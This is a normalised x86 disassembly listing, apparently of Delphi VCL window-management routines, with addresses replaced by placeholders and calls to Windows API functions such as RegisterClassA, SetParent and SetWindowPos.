pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor edx edx
push ebp
push sub_45089f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450b10
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41814c
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4182a8
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450b10
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_44cb48
mov dl 0x4
call sub_44cb48
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418198
sub_45090c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_464dc0
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_468bdc
sub_45092c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44bf28
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44bf28
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44bf28
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_450978
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44bf50
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44bf50
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44bf50
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_4509c0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403370
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44e7e8
mov edx ebx
mov eax edi
call sub_45092c
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44e7e8
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44e7e8
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax edi
call sub_454120
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44e7e8
mov eax edi
call sub_451510
jmp r-xdata
mov edx ebx
mov eax edi
call sub_450620
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450a94
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44e7e8
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax esi
call sub_454120
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_45090c
mov eax ebp
call sub_451374
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450978
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44e7e8
mov eax esi
call sub_4506dc
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44da7c
sub_450b10
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4182a8
mov edx edi
mov eax ebp
call sub_4182a8
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_450b6c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_450b4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_450b10
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_450bac
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_450b6c
add esp 0x10
retn
sub_450bd4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_450c40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44dc78
test al al
je r-xdata
mov eax ebx
call sub_44dca8
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403370
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403370
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403370
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_450ca8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_450dc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b80
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_450c40
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_453e1c
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030c4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404150
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40864c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450dcd
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_450dd4
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450f95
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_44a428
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_44a428
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40ca90
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40ca90
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_4087ec
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_45412c
push 0x1
mov eax [ esi + 0x68 ]
call sub_423a58
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44e7e8
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_453e1c
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450f9c
lea eax [ ebp - 0xc0 ]
call sub_403eec
retn
mov eax esi
mov si 0xffee
call sub_403370
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_450fa4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406ae0
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_450fe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cd04
mov eax esi
call sub_41cc54
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41cc54
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41cd0c
pop esi
pop ebx
retn
sub_45101c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41ef10
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41ee44
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41ee44
mov eax esi
call sub_41ef18
add esp 0x10
pop esi
pop ebx
retn
sub_451084
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_451070
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4182a8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4182a8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_45115c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44eb20
mov eax [ ebp - 0x8 ]
push eax
push sub_450fe4
mov eax [ ebp - 0x8 ]
push eax
push sub_45101c
push ebp
call sub_451084
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4511b8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44d5a8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4087a0
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4087b4
mov ecx eax
mov edx edi
mov eax ebx
call sub_44d5b8
mov eax r-xdata
call sub_4087c0
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44c05c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_451210
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_45125d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451264
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40ca90
sub_451274
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_418304
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4182a8
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_4512bc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_451274
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_450b10
call sub_44cc88
inc edi
dec esi
jne r-xdata
sub_451358
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_451374
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4182a8
call sub_451374
inc edi
dec esi
jne r-xdata
sub_4513d4
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403370
mov ebx eax
mov eax edi
call sub_451374
mov eax edi
call sub_451510
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_451414
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_4514ea
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44e7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4182a8
call sub_451414
inc esi
dec ebx
jne r-xdata
sub_451510
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_451414
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_451550
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_451374
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_451510
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406ac8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44e7e8
jmp r-xdata
sub_4515d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451630
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45161f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451626
call sub_44c05c
call sub_4263a4
retn
sub_451650
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416c28
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406ab0
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44e7e8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_451708
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4182a8
call sub_451650
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4182a8
call sub_451650
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_45179c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_453e1c
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406a9c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451708
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ab0
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44e7e8
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_451830
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44dda4
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44e8b4
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45179c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406a9c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_44d178
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_451708
test eax eax
je r-xdata
mov eax ebx
call sub_464dc0
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44e8b4
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_453e1c
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_453e1c
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44e7e8
sub_451994
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44ea48
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44e7e8
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
